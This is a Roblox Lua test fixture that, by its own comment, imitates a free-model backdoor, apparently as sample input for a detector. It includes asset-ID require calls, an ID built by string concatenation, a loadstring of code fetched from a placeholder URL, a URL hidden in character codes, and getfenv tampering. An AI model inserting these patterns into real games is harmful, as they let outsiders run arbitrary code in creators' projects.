-- Test fixture: imitates a free-model backdoor. Never used at runtime.
local id = 1234567890
require(1234567890)
local m = require(tonumber("123" .. "4567"))
local f = loadstring(game:GetService("HttpService"):GetAsync("https://example.invalid/p"))
local hidden = string.char(104, 116, 116, 112, 115, 58, 47, 47, 101, 120, 97, 109, 112, 108, 101)
getfenv(1).x = id
